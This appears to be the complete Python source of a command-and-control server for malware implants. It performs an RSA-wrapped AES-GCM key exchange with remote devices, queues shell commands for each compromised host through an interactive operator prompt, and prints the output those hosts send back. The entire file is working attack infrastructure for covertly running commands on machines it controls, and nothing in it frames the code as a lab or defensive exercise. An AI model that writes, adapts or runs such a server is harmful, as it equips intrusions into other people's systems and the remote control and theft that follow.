from http.server import HTTPServer, BaseHTTPRequestHandler
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import json
import os
import base64
import sys
import threading

# Load RSA private key
with open("private_key.pem", "rb") as f:
    PRIVATE_KEY = serialization.load_pem_private_key(f.read(), password=None)

sessions = {}
command_queue = {}

PORT = 8443
if len(sys.argv) > 1:
    PORT = int(sys.argv[1])


class C2Handler(BaseHTTPRequestHandler):

    def aes_encrypt(self, key, plaintext):
        iv = os.urandom(12)
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext.encode()) + encryptor.finalize()
        return base64.b64encode(iv + ciphertext + encryptor.tag).decode()

    def aes_decrypt(self, key, ciphertext_b64):
        data = base64.b64decode(ciphertext_b64)
        iv = data[:12]
        ciphertext = data[12:-16]
        tag = data[-16:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag))
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext).decode()

    def get_next_command(self, device_id):
        """Return next command for device, or empty string if none."""
        if device_id in command_queue and command_queue[device_id]:
            return command_queue[device_id].pop(0)
        return ""

    def store_output(self, device_id, output_data):
        """Store command output (for now just log, could save to file)."""
        # You can save to file here if you want
        pass

    def do_GET(self):
        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        if self.path == '/handshake':
            self.handle_handshake()
        elif self.path == '/recv':
            self.handle_recv()
        elif self.path == '/send':
            self.handle_send()
        else:
            self.send_response(404)
            self.end_headers()

    def handle_handshake(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))

            device_id = data.get('device_id')
            encrypted_aes_key = base64.b64decode(data.get('encrypted_aes_key'))

            aes_key = PRIVATE_KEY.decrypt(
                encrypted_aes_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )

            sessions[device_id] = {
                'aes_key': aes_key,
                'ip': self.client_address[0]
            }

            print(f"[+] Handshake successful from {device_id} ({self.client_address[0]})")
            print(f"[+] AES key: {aes_key.hex()[:16]}...")

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'success'}).encode())

        except Exception as e:
            print(f"[-] Handshake failed: {e}")
            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'error', 'reason': str(e)}).encode())

    def handle_recv(self):
        try:
            # Get device_id from header
            device_id = self.headers.get('X-Device-ID')
           #print(f"[DEBUG] recv request from device: {device_id}")

            if not device_id:
                print(f"[-] Missing X-Device-ID header")
                self.send_error(400, "Missing X-Device-ID")
                return

            if device_id not in sessions:
                print(f"[-] Device {device_id} not found in sessions")
               #print(f"[DEBUG] Available sessions: {list(sessions.keys())}")
                self.send_error(401, "Unknown device")
                return

            aes_key = sessions[device_id]['aes_key']
            #print(f"[DEBUG] Using AES key: {aes_key.hex()[:16]}...")

            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))

           #print(f"[DEBUG] Received encrypted data length: {len(data['data'])}")

            # Decrypt the request
            decrypted = self.aes_decrypt(aes_key, data['data'])
            request_data = json.loads(decrypted)
            #print(f"[DEBUG] Decrypted: {request_data}")

            # Get command for this device
            command = self.get_next_command(device_id)
            #print(f"[DEBUG] Sending command: {command}")

            # Encrypt response
            response_data = json.dumps({'command': command})
            encrypted_response = self.aes_encrypt(aes_key, response_data)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'data': encrypted_response}).encode())

        except Exception as e:
            print(f"[-] recv error: {e}")
            import traceback
            traceback.print_exc()
            self.send_error(500)

    def handle_send(self):
        try:
            # Get device_id from header
            device_id = self.headers.get('X-Device-ID')
            print(f"[DEBUG] send request from device: {device_id}")

            if not device_id:
                print(f"[-] Missing X-Device-ID header")
                self.send_error(400, "Missing X-Device-ID")
                return

            if device_id not in sessions:
                print(f"[-] Device {device_id} not found in sessions")
                self.send_error(401, "Unknown device")
                return

            aes_key = sessions[device_id]['aes_key']
           # print(f"[DEBUG] Using AES key: {aes_key.hex()[:16]}...")

            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))

            #print(f"[DEBUG] Received encrypted data length: {len(data['data'])}")

            # Decrypt the request
            decrypted = self.aes_decrypt(aes_key, data['data'])
            output_data = json.loads(decrypted)
            print(f"[DEBUG] Decrypted output from {device_id}")

            # Print the output
            print(f"\n[+] Output from {device_id}:")
            print("=" * 50)
            print(output_data['output'])
            print("=" * 50)
            print(f"[+] Exit code: {output_data['exit_code']}")

            # Store for later if needed
            self.store_output(device_id, output_data)

            # Send acknowledgment
            response_data = json.dumps({'status': 'received'})
            encrypted_response = self.aes_encrypt(aes_key, response_data)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'data': encrypted_response}).encode())

        except Exception as e:
            print(f"[-] send error: {e}")
            import traceback
            traceback.print_exc()
            self.send_error(500)

    def log_message(self, format, *args):
        pass


def run_server(port=8443):
    server = HTTPServer(('0.0.0.0', port), C2Handler)
    print(f"[+] C2 Server listening on port {port}")
    print("[+] Waiting for implants to connect...")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[+] Shutting down...")
        server.server_close()


def command_interface():
    print("\n[+] C2 Interactive Shell Ready")
    print("Type 'help' for commands, 'list' to see devices, 'exit' to quit")
    while True:
        try:
            cmd = input("\nC2> ").strip()

            if cmd == 'exit':
                break
            elif cmd == 'list':
                print("Connected devices:")
                for did in sessions:
                    print(f"  - {did} (last seen: {sessions[did].get('ip', 'unknown')})")
            elif cmd.startswith('interact '):
                parts = cmd.split(' ')
                if len(parts) < 2:
                    print("Usage: interact <device_id>")
                    continue
                device_id = parts[1]
                if device_id not in sessions:
                    print(f"[-] Device {device_id} not found")
                    continue
                print(f"[*] Interacting with {device_id}. Type commands, 'back' to exit.")
                while True:
                    try:

                        shell_cmd = input(f"{device_id}> ").strip()
                        if shell_cmd == 'back':
                            break
                        if not shell_cmd:
                            continue
                        # Queue command for this device
                        if device_id not in command_queue:
                            command_queue[device_id] = []
                        command_queue[device_id].append(shell_cmd)
                        print(f"[*] Command queued: {shell_cmd}")
                    except KeyboardInterrupt:
                        print("\n[*] Returning to main menu...")
                        break
            elif cmd == 'help':
                print("Commands:")
                print("  list                 - Show connected devices")
                print("  interact <device_id> - Send commands to a device")
                print("  exit                 - Exit C2 interface")
            else:
                print(f"Unknown command: {cmd}")
        except KeyboardInterrupt:
            break
        except EOFError:
            break


if __name__ == "__main__":
    port = 8443
    if len(sys.argv) > 1:
        port = int(sys.argv[1])
    server_thread = threading.Thread(target=run_server, args=(port,))
    server_thread.daemon = True
    server_thread.start()
    command_interface()